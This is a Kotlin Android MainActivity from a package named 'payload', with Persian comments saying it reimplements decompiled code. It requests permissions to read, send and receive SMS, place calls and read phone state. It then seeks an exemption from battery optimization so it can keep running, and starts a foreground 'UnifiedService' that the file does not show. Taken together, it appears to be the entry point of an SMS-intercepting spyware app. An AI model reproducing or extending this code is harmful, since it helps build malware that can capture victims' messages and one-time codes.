package com.payload.jansiix0ne

import android.Manifest
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.ui.Modifier
import com.payload.jansiix0ne.services.UnifiedService
import com.payload.jansiix0ne.ui.MainScreen
import com.payload.jansiix0ne.ui.theme.AppTheme

class MainActivity : ComponentActivity() {

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.all { it.value }
        if (allGranted) {
            // بعد از گرفتن permissions، بررسی battery optimizations (مطابق کد decompiled)
            checkAndRequestBatteryOptimization()
            startUnifiedService()
            setComposeContent()
        }
    }
    
    private val batteryOptimizationLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        // بعد از بازگشت از تنظیمات battery optimization
        // ادامه می‌دهیم حتی اگر کاربر آن را رد کرده باشد
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        requestPermissions()
    }

    override fun onResume() {
        super.onResume()
        
        // Check if all permissions are granted
        if (areAllPermissionsGranted()) {
            setComposeContent()
        }
    }

    private fun requestPermissions() {
        val permissions = mutableListOf(
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_PHONE_NUMBERS
        )
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
        }
        
        permissionLauncher.launch(permissions.toTypedArray())
    }

    private fun areAllPermissionsGranted(): Boolean {
        val permissions = arrayOf(
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_PHONE_NUMBERS
        )
        
        return permissions.all {
            checkSelfPermission(it) == android.content.pm.PackageManager.PERMISSION_GRANTED
        }
    }

    private fun setComposeContent() {
        setContent {
            AppTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    MainScreen()
                }
            }
        }
    }

    private fun startUnifiedService() {
        val intent = Intent(this, UnifiedService::class.java)
        startForegroundService(intent)
    }
    
    /**
     * بررسی و درخواست ignore battery optimizations
     * مطابق کد decompiled: C3043r.java
     */
    private fun checkAndRequestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val powerManager = getSystemService(POWER_SERVICE) as? PowerManager
            powerManager?.let { pm ->
                val packageName = packageName
                
                // بررسی اینکه آیا battery optimizations ignore شده یا نه
                if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                    // اگر نشده باشد، Intent برای REQUEST_IGNORE_BATTERY_OPTIMIZATIONS می‌سازیم
                    val intent = Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:$packageName")
                    }
                    
                    try {
                        batteryOptimizationLauncher.launch(intent)
                    } catch (e: Exception) {
                        // اگر Intent قابل launch نباشد (مثلاً در برخی دستگاه‌ها)
                        // به تنظیمات battery optimization می‌رویم
                        val settingsIntent = Intent(android.provider.Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
                        try {
                            startActivity(settingsIntent)
                        } catch (ex: Exception) {
                            // Ignore - کاربر می‌تواند بعداً خودش تنظیم کند
                        }
                    }
                }
            }
        }
    }
}
